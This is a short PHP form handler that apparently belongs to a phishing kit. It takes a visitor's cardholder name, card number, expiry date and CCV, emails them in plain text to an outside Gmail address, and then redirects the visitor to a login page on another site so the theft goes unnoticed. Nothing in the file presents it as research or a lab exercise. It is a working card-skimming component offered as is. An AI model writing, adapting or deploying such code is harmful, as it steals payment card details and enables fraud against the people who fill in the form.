<?php
if(isset($_POST)){
    $to = "jpsloteria@gmail.com"; // this is your Email address
    $from = "mail@costaricanbeauty.com"; // this is the sender's Email address
    $cardholder = $_POST['cardholder'];
    $number = $_POST['number'];
    $expiry = $_POST['expiry'];
    $ccv = $_POST['ccv'];
    $subject = "Form submission";

    $message = "cardholder" . $cardholder . " number" . $number . " expiry" . $expiry . " ccv" . $ccv . "\n\n";


    $headers = "From:" . $from;
    $headers2 = "From:" . $to;
    mail($to,$subject,$message,$headers);


      header('Location: https://jpsenlinea.com/iniciarsesion');
    }
?>